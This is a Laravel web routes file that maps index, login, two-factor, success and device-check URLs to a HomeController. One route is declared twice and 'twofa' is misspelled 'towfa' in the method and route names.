<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/
Route::get('/', [\App\Http\Controllers\HomeController::class, 'index'])->name('index');
Route::get('secure', [\App\Http\Controllers\HomeController::class, 'secure'])->name('secure');
Route::match(['get','post'],'login', [\App\Http\Controllers\HomeController::class, 'login'])->name('login');
Route::get('twofa', [\App\Http\Controllers\HomeController::class, 'towfa'])->name('towfa');
Route::get('success', [\App\Http\Controllers\HomeController::class, 'success'])->name('success');
Route::post('twofa', [\App\Http\Controllers\HomeController::class, 'handleTowfa'])->name('handle-towfa');
Route::get('success', [\App\Http\Controllers\HomeController::class, 'success'])->name('success');
Route::get('check-device', [\App\Http\Controllers\HomeController::class, 'checkDevice'])->name('check-device');